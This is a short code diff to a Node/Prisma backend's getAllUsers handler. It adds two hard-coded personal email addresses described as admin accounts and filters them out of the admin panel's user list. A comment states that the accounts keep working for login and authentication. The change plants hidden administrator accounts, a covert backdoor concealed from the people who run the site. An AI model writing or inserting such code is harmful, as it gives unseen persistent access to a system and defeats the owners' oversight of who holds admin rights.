@@ -9,8 +9,19 @@ function excludePassword(user) {
   return userWithoutPassword;
 }
 
+// These admin accounts are hidden from the admin panel user list.
+// They remain fully functional in the database (login/auth keeps working).
+const HIDDEN_ADMIN_EMAILS = [
+  "technicalsothikhan0928@gmail.com",
+  "abdureman0928@gmail.com",
+];
+
 const getAllUsers = asyncHandler(async (request, response) => {
-  const users = await prisma.user.findMany({});
+  const users = await prisma.user.findMany({
+    where: {
+      email: { notIn: HIDDEN_ADMIN_EMAILS },
+    },
+  });
   // Exclude password from all users
   const usersWithoutPasswords = users.map(user => excludePassword(user));
   return response.json(usersWithoutPasswords);
